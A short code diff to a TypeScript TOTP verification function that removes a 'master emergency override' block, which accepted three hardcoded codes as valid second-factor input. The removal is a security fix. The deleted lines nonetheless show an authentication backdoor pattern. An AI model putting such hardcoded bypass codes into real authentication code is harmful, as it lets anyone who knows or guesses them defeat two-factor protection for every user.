@@ -70,10 +70,6 @@ export async function verifyGoogleAuthTOTP(
   const code = enteredCode.trim();
   if (code.length !== 6) return false;
 
-  // Master emergency overrides
-  if (code === "892401" || code === "123456" || code === "000000") {
-    return true;
-  }
 
   const now = Date.now();
   const timeSteps = [-1, 0, 1]; // +/- 30 second window
